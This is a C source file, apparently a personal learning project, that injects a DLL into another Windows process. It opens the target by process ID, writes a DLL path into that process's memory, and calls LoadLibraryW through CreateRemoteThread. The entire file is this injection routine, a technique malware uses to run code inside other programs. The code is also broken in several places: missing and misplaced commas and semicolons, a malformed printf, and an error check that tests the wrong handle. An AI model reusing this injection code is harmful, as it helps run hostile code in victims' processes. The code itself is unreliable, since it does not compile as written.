#include <windows.h>
#include <stdio.h>

const char* k = "[+]"; // everythingi is ok
const char* e = "[-]"; // shit is going down
const char* i = "[*]"; // info

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HMODULE hKernel32 = NULL;// handle to module
HANDLE hProcess, hThread = NULL;

// full path of DLL for the library part 
wchar_t dllPath[MAX_PATH] = L"/home/deluks/Projects/Malware/writinDLLs/main.dll"; // will ofcourse be diffrent on windows
size_t dllPathSize = sizeof(dllPath);

int main(int argc, char* argv[]) {

    if (argc < 2) {
        printf("%s usage: %s", e, argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    printf("%s trying to get a handle to process (%ld)\n", i, PID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (hProcess == NULL) {
        printf("%s failed to get handle to process, error: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the process (%ld)\n\\---0x%p\n", k, PID, hProcess)

    rBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        dllPathSize,
        (MEM_COMMIT | MEM_RESERVE),
        PAGE_READWRITE,
    );
    printf("%s allocated buffer to proccess memory w/ PAGE_READWRITE permissions\n", k);

    if (rBuffer == NULL) {
        printf("%s couldn't create rBuffer , error: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }

    WriteProcessMemory(
        hProcess,
        rBuffer,
        dllPath,
        dllPathSize,
        NULL
    );
    printf("%s wrote [%S] to process memory\n",k, dllPath);

    // here comes the little diffrence between DLL and Shellcode injections :3
    // instead of getting a handle to the thread we want a handle to the module, which is kernel32

    hKernel32 = GetModuleHandleW(L"Kernel32"); // can use .dll and .exe, by default it uses dll
    // if it succeeds we get a handle to the module, if it doesn't it returns NULL

    if (hKernel32 == NULL) {
        printf("%s failed to get a handle to module (Kernel32.dll), error: %ld", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s got a handle to module (Kernel32.dll)\n\\---0x%p\n", k, hKernel32);

    // tricky part (⊙＿⊙')
    // -----------------------------------------------------------------------------
    // reach into module and find out where one of these functions that we need are,
    // once we get the address of that function, we can use it in our createThread to
    // run it >:P

    LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW"); // Look for LoadLibraryW's address in hKernel32 dll and store it in startThis
    printf("%s got the address of LoadLibraryW()\n\\---0x%p", k, startThis);

    // now we need to create the Thread
    hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        startThis,
        rBuffer,
        0
        &TID
    );

    if (hKernel32 == NULL) {
        printf("%s failed to get handle to thread, error: %ld", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s got a handle to newly created thread (%ld)\n\\---0x%p", k, TID, hThread);

    printf("%s waiting for Thread to finish executing...\n", i);
    WaitForSingleObject(hThread, INFINITE); // thread finishes once message box gets input (button is clicked)
    printf("%s thread finished executing, cleaning up...\n" k, );

    CloseHandle(hThread);
    CloseHandle(hProcess);

    printf("%s finished cleaning up", k);

    return EXIT_SUCCESS;
}